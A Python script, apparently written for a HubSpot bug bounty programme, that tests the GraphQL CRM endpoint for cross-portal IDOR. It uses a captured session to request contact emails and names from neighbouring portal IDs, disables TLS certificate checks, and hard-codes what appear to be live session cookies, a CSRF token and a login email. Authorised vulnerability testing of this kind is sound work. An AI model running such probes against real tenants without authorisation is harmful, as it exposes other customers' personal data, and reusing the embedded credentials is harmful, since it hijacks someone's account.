#!/usr/bin/env python3
"""
HubSpot Cross-Portal IDOR Test
================================

Tests if portal 242862774 can access data from other portals via GraphQL.
This is the CRITICAL test for HubSpot's bug bounty scope.

Target: Cross-portal data access (explicitly in-scope per Scope.md line 39)
Expected: Should be blocked (403/404)
Vulnerability: If successful (200 OK with data), this is a CRITICAL P1 finding

Author: Chavvo DA
Date: 2025-10-18
"""

import urllib.request
import urllib.error
import json
import ssl

# ============================================================================
# CONFIGURATION - Low-Privileged Account Credentials
# ============================================================================

HUBLET = "na2"
YOUR_PORTAL_ID = "242862774"

# CSRF Token (from X-HubSpot-CSRF-hubspotapi header)
CSRF_TOKEN = "AAccUftqXIglabnMcD-9ShAerUMvSBDgbbSN4okdhnFFJzdSOen4p1Ylb05yqCm1jzCTa67Sd-4Z14syasWz3s0oVkqC48IdIQ"

# Full cookie header (captured from GraphQL request)
COOKIE_HEADER = "__hs_cookie_cat_pref=1:true_2:true_3:true; hubspotutk=61540ed14959970838d32bf890933b17; FPID=FPID2.2.aoifmDM9VHjP%2B0DNcWTT94YC%2FEDGX%2BQUKaCl%2Fjdgdtg%3D.1750377867; csrf.app=AAccUftqXIglabnMcD-9ShAerUMvSBDgbbSN4okdhnFFJzdSOen4p1Ylb05yqCm1jzCTa67Sd-4Z14syasWz3s0oVkqC48IdIQ; hubspotapi-prefs=0; hs_c2l=GM2U_VYiGQAQstEnImf9GGYYEuXCtIZHai-lwv2vJf8; hs_login_email=buttercup_ck@bugcrowdninja.com; laboratory-anonymous-id=anon3a47f7fc8dce04269224c103f75d; __cf_bm=7dKH9qDJDePvToxZAQU2SiY9i3jf2hve9xuuilwLi8I-1760826732-1.0.1.1-vda.Eac5sCDeWfipJ.KXp8IBAFzrsMW6IcJ7796LRiMWTHoqND0jb2sJSesiIl1mYiJOPSfZQbxGhdPo27YfS_duaGQm.vL8Hza_AAUBGWY; _cfuvid=P4L2XIuM4PEgjpdNcPGFVoP.Gx2I5WQ0OYD_UVZt5Ak-1760824013150-0.0.1.1-604800000; _conv_v=vi%3A1*sc%3A1*cs%3A1760824014*fs%3A1760824014*pv%3A1*exp%3A%7B100330256.%7Bv.1003131869-g.%7B%7D%7D-100347543.%7Bv.1003176559-g.%7B%7D%7D%7D*seg%3A%7B10031564.1-10034364.1-10034366.1%7D; __hstc=20629287.61540ed14959970838d32bf890933b17.1760824016750.1760824016750.1760824016750.1; __hssrc=1; _gcl_au=1.1.36100814.1760824017; hubspotapi-strict=AAccUfv7-gRXdDwtspRytheRo1Dvt8v7fuKZuRDsHaeXEWjZPFkEJDuMrjhEBZcUuBau3tV8DYImQGx1CV9dT4yyki7Alsho1Q; hs_login_metadata=%7B%22ungatedForLoginV4%22%3Afalse%2C%22showABTestVariant%22%3Afalse%2C%22isMobileLogin%22%3Afalse%7D; NPS_e579c260_last_seen=1760824080763; hubspotapi=AAccUfvVqwV8ckfVjAgXHHypyMDdw0i0LwSis7xqtiu5I0mJuSd4nxO8uq0nENoWGgcoyJCBwGg5VQYZwWefh3MCx_4Bgw2A21ungsVaRLcEyaQgHbaZjBoQEcmJYJAuKpk-P5iRa8fm92QGJHx5ZBh8fvOUTZuP5VBXA5dCtO4sfrv3c5awVXPi5SRHYelLVgC0sIwo0p8Mt9XS2YZeAqwE1wx-dIoSzymZG0IMWW2NY2V76HiyHg6D_57S5hJOBYjzZfMNueH9qHf4HRv2NunFoskMHvnDLLip300xpVnF3-PMQ4jZCtV1YB1oGKoNhoMPUgoBg2J4wqynDjCXdxh-X2Lx9U3YWoLfSl12cktnEOWstGIvx-HvgInq2qJ9kCUtkKzZPMXAhTUF8ZeRO_vnKeHbNKZrTDWdO0MEKaleWNmcj4S71XdH6w1EbAJbDf94NET2-83k6FGyQqTcjR3o5Awvu61SlazIbrDCQj-q1guN6DrspqOq4AAQGKyJ1fAlJ8F2uXxWqlAhDMZYumCvvhSBwbCx51yi6sAid3DClmbJUs7iCCwzmj77X2SZ1_4NEmXji2DqUOJPSRcpH6gH3TxRitvR77-tE8p-4lofLsROfThy_nahXzYUPi05qwwRoonjrUgIg4uApDaFYCcQ3goN_TD59IKi2ziR1iZG2C5ukLtvewLzVsxAAnOkS60NEd_f3TRCLcHGcvL2KNh9d_diw-h4zlm7jFsWTH2gk40axNoXeIR9EpwaAciVTxRCqgwW52Gv4tRcrvnSEjLQ32fE3BdNxVSO5gXzEFeY6MYHopBWNJrcvOPKpgPOh3QwTF_LRWFl8pIwaQuRvz1CwCii2N4TZVBhps8wStuhhts_rB1WvZJZzAKaX7q6zanvbAMpR4ocOQy2sVuY-vDD2O8qmGRjlgkcTEyk4b1YCPHWqo9h2RPUKmuOTGUC3VvTpcNQ8HJFsH3r5Kboy1SMNZlkhu50JJ4bE2kYH2S6jg5Z8-c8YT_zT26tD7RLABQtm0yRm6u7pRbnrQopL9YTTh3T_Q5g2hcVNWJJ_7TrpgCPUBorRx34_UgEB8mM9sVy59PwI1s-_y6xs0SD8HnvBtQFa_9A2nuHeebTNkO8vuOTdoATs_cbaD-4sM90zYFr6w-E8vhzJoawsK00Vb7JvJbnvNRrdPI31KQz_Rk6Sk6ch7z1Ub7qAzwudLmVYKQ1MBi1Z-jqS7eKjsIrfXvj51PvnYKvA90_H0Ix1IA_vBKbmTJImOIea1Kx1rX7D5li0hFMs3wPat-JuvFya-lmclMFSRERg8D9lZD3Ss4oH-fsq5EiT5umZhYssM5nGl-Ej7fgKbF52pY6TR87wu-vZBgh-TmM64IaDqdN9368YBE-HO2R33vhlzZQggf4IgkVP1bUJBRXRJGn0KfU0BMm-ZfNNyJXWfTasKNyj-SqdDvdTa4n-ZU; hubspotapi-csrf=AAccUftqXIglabnMcD-9ShAerUMvSBDgbbSN4okdhnFFJzdSOen4p1Ylb05yqCm1jzCTa67Sd-4Z14syasWz3s0oVkqC48IdIQ"

# ============================================================================
# TEST CONFIGURATION
# ============================================================================

# Portal IDs to test (your portal + sequential ones)
PORTAL_IDS_TO_TEST = [
    YOUR_PORTAL_ID,           # Baseline - should work
    "242862775",              # +1
    "242862776",              # +2
    "242862777",              # +3
    "100000000",              # Random low ID
]

# GraphQL query to extract Contact data with PII fields
# This query searches for contacts and extracts email, firstname, lastname
CONTACT_SEARCH_QUERY = """
query ContactSearch {
  crmObjectsSearch(
    type: "0-1"
    filterGroups: []
    count: 5
    offset: 0
  ) {
    total
    results {
      id
      properties(names: ["email", "firstname", "lastname"]) {
        name
        value
      }
    }
  }
}
"""

# ============================================================================
# HTTP REQUEST FUNCTIONS
# ============================================================================

def test_graphql_portal_access(portal_id, query):
    """
    Test GraphQL access to a specific portal ID.

    Returns:
        dict: {
            'status': int,
            'success': bool,
            'data': dict or None,
            'error': str or None
        }
    """

    # Build URL with portal ID in query parameter
    url = f"https://app-{HUBLET}.hubspot.com/api/graphql/crm"
    params = f"?portalId={portal_id}&clienttimeout=14000&hs_static_app=crm-index-ui&hs_static_app_version=2.49724"
    full_url = url + params

    # Build request body (array format as observed in captured request)
    body = json.dumps([{
        "operationName": "ContactSearch",
        "variables": {},
        "query": query
    }])

    # Create request
    req = urllib.request.Request(full_url, method='POST')
    req.add_header('Content-Type', 'application/json')
    req.add_header('Cookie', COOKIE_HEADER)
    req.add_header('X-HubSpot-CSRF-hubspotapi', CSRF_TOKEN)
    req.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0')
    req.add_header('Accept', 'application/json')
    req.add_header('Origin', f'https://app-{HUBLET}.hubspot.com')

    # Bypass SSL verification (for testing only)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        # Execute request
        response = urllib.request.urlopen(req, body.encode('utf-8'), context=ctx)
        response_data = response.read().decode('utf-8')

        # Parse JSON response
        data = json.loads(response_data)

        return {
            'status': response.status,
            'success': True,
            'data': data,
            'error': None
        }

    except urllib.error.HTTPError as e:
        error_body = e.read().decode('utf-8', errors='ignore')
        try:
            error_data = json.loads(error_body)
        except:
            error_data = error_body

        return {
            'status': e.code,
            'success': False,
            'data': error_data,
            'error': f"HTTP {e.code}: {e.reason}"
        }

    except Exception as e:
        return {
            'status': 0,
            'success': False,
            'data': None,
            'error': str(e)
        }

# ============================================================================
# RESULT ANALYSIS
# ============================================================================

def analyze_result(portal_id, result):
    """
    Analyze test result and determine vulnerability status.
    """

    is_baseline = (portal_id == YOUR_PORTAL_ID)
    status = result['status']

    # Baseline test (your own portal)
    if is_baseline:
        if status == 200 and result['success']:
            return "✅ BASELINE OK", "Your portal is accessible (expected)"
        else:
            return "❌ BASELINE FAIL", f"Cannot access your own portal (status {status})"

    # Cross-portal test (other portals)
    else:
        if status == 200 and result['success']:
            # Check if actual data was returned
            try:
                data = result['data']
                if isinstance(data, list) and len(data) > 0:
                    search_results = data[0].get('data', {}).get('crmObjectsSearch', {})
                    total = search_results.get('total', 0)
                    results = search_results.get('results', [])

                    if total > 0 or len(results) > 0:
                        return "🚨 CRITICAL VULNERABILITY", f"Accessed {total} contacts from portal {portal_id}!"
                    else:
                        return "⚠️ SUCCESS BUT NO DATA", "200 OK but no contacts returned"
                else:
                    return "⚠️ SUCCESS BUT NO DATA", "200 OK but unexpected response format"
            except:
                return "⚠️ SUCCESS BUT PARSE ERROR", "200 OK but couldn't parse response"

        elif status == 403:
            return "✅ BLOCKED (403)", "Access forbidden (expected - security working)"
        elif status == 404:
            return "✅ BLOCKED (404)", "Portal not found (expected)"
        elif status == 401:
            return "✅ BLOCKED (401)", "Unauthorized (expected - security working)"
        elif status == 488:
            return "ℹ️ WRONG HUBLET (488)", "Portal exists on different hublet"
        else:
            return "⚠️ UNEXPECTED STATUS", f"Status {status}: {result.get('error', 'Unknown')}"

# ============================================================================
# MAIN TEST EXECUTION
# ============================================================================

def main():
    print("=" * 80)
    print("HubSpot Cross-Portal IDOR Test")
    print("=" * 80)
    print(f"\nYour Portal ID: {YOUR_PORTAL_ID}")
    print(f"Hublet: {HUBLET}")
    print(f"Testing {len(PORTAL_IDS_TO_TEST)} portal IDs...\n")
    print("=" * 80)

    results = []
    vulnerability_found = False

    for i, portal_id in enumerate(PORTAL_IDS_TO_TEST, 1):
        is_baseline = (portal_id == YOUR_PORTAL_ID)
        test_type = "BASELINE" if is_baseline else "IDOR TEST"

        print(f"\n[{i}/{len(PORTAL_IDS_TO_TEST)}] {test_type}: Portal {portal_id}")
        print("-" * 80)

        # Execute test
        result = test_graphql_portal_access(portal_id, CONTACT_SEARCH_QUERY)

        # Analyze result
        verdict, explanation = analyze_result(portal_id, result)

        # Display result
        print(f"Status: {result['status']}")
        print(f"Verdict: {verdict}")
        print(f"Details: {explanation}")

        # Show data preview if available
        if result['success'] and result['data']:
            try:
                data = result['data']
                if isinstance(data, list) and len(data) > 0:
                    search_data = data[0].get('data', {}).get('crmObjectsSearch', {})
                    total = search_data.get('total', 0)
                    contacts = search_data.get('results', [])

                    print(f"Total Contacts: {total}")
                    print(f"Returned: {len(contacts)} contacts")

                    # Show first contact (redacted)
                    if contacts:
                        first_contact = contacts[0]
                        props = first_contact.get('properties', [])
                        print(f"First Contact ID: {first_contact.get('id', 'N/A')}")
                        for prop in props:
                            value = prop.get('value', '')
                            # Redact email/name for display
                            if value:
                                redacted = value[:3] + "***" + value[-3:] if len(value) > 6 else "***"
                                print(f"  - {prop.get('name')}: {redacted}")
            except Exception as e:
                print(f"Data parsing error: {e}")

        # Check for vulnerability
        if "CRITICAL VULNERABILITY" in verdict:
            vulnerability_found = True

        # Store result
        results.append({
            'portal_id': portal_id,
            'verdict': verdict,
            'explanation': explanation,
            'result': result
        })

    # ========================================================================
    # FINAL REPORT
    # ========================================================================

    print("\n" + "=" * 80)
    print("FINAL REPORT")
    print("=" * 80)

    baseline_success = results[0]['result']['success'] if results else False

    if not baseline_success:
        print("\n❌ BASELINE TEST FAILED")
        print("Your own portal is not accessible. Check:")
        print("  1. Cookies are fresh (not expired)")
        print("  2. CSRF token matches cookie value")
        print("  3. Portal ID is correct")
        print("  4. You're logged into the low-privileged account")

    elif vulnerability_found:
        print("\n🚨 CRITICAL VULNERABILITY DETECTED 🚨")
        print("\nCross-portal IDOR vulnerability confirmed!")
        print("You can access data from other portals.")
        print("\n📋 NEXT STEPS:")
        print("  1. Document all findings")
        print("  2. Create bug bounty report with evidence")
        print("  3. Include:")
        print("     - Portal IDs tested")
        print("     - Number of contacts accessible")
        print("     - PII fields exposed (email, name)")
        print("     - HTTP requests/responses")
        print("  4. Submit to HubSpot security")
        print("\n💰 SEVERITY: CRITICAL (P1)")
        print("   Scope: Cross-portal data access (Scope.md line 39)")
        print("   Impact: Multi-tenant isolation bypass")
        print("   Data: PII exposure (emails, names)")

    else:
        print("\n✅ NO VULNERABILITY DETECTED")
        print("\nCross-portal isolation appears to be working correctly.")
        print("All cross-portal requests were blocked as expected.")
        print("\nResults summary:")
        for r in results[1:]:  # Skip baseline
            print(f"  - Portal {r['portal_id']}: {r['verdict']}")

    print("\n" + "=" * 80)
    print("Test Complete")
    print("=" * 80)

    return 0 if not vulnerability_found else 1

if __name__ == "__main__":
    exit(main())
